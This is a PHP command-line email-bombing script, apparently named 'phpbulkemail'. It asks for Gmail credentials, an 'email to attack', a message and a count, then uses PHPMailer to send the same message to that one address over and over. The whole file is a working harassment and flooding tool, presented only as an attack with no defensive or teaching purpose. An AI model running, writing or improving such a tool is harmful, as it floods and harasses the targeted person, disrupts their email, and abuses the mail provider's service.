<?php 

function ask_hidden() {
	echo "[#] Your password: ";

	echo "\033[30;40m";  
	$password = readline();
	echo "\033[0m";      

	return rtrim($password, "\n");
}

echo "\n-> phpbulkemail\n";
echo "-> https://github.com/zeitclear/phpbulkemail \n";
echo "------------------------------------------------ \n\n";

$email = readline("[#] Your email: ");

$password = ask_hidden();

$emailToAttack = readline("[#] Email to attack: ");
$quantity = readline("[#] Quantity to send emails: ");

echo "------------------------------------------------ \n";

$subject = readline("[!] Subject: ");
$body = readline("[!] Body: ");

echo "------------------------------------------------ \n";


// PHPMailer required (composer require phpmailer/phpmailer)

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';
$mail = new PHPMailer(true);


$count = 0;
while($count <= $quantity) {
    try {     
        $mail->isSMTP();                                            
        $mail->Host       = 'smtp.gmail.com';                 
        $mail->SMTPAuth   = true;                                  
        $mail->Username   = $email;                    
        $mail->Password   = $password;                            
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         
        $mail->Port       = 587;                                   
    
        $mail->setFrom($email);
        $mail->addAddress($emailToAttack);    
    
        $mail->isHTML(true);                                  
        $mail->Subject = $subject;
        $mail->Body    = $body;
    
        $mail->send();

        echo "[$count] Email sent to {$emailToAttack}!\n";
    } catch (Exception $e) {
        echo "Error: {$mail->ErrorInfo}";
    }
    $count++;
}
?>